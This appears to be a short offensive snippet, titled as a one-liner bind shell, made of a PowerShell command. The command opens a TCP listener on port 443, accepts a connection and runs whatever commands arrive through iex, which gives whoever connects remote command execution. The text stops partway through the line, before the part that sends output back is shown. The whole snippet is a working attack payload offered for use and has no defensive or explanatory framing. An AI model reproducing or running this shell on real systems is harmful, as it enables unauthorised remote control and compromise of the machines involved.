#One liner bind-shell

powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(
'0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie
nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt
es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString
($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'P
